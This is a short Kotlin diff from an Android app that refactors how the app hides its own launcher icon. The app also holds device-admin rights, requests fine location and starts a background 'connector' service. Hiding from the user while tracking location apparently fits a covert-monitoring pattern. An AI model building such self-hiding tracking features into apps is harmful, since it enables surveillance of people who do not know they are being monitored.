@@ -25,7 +25,7 @@ class MainActivity : AppCompatActivity() {
 
     private val dpm by lazy { getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager }
     private val adminComponent by lazy { ComponentName(this, AppDeviceAdminReceiver::class.java) }
-    private val launcherAlias by lazy { ComponentName(this, "$packageName.MainLauncherAlias") }
+    private val launcherAlias by lazy { AppIcon.aliasComponent(this) }
 
     private val RUNTIME_PERMISSIONS = arrayOf(
         Manifest.permission.ACCESS_FINE_LOCATION,
@@ -110,13 +110,7 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun hideAndExit() {
-        try {
-            packageManager.setComponentEnabledSetting(
-                launcherAlias,
-                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                PackageManager.DONT_KILL_APP
-            )
-        } catch (_: Exception) {}
+        AppIcon.hide(this)
         startConnectorService()
         finish()
     }
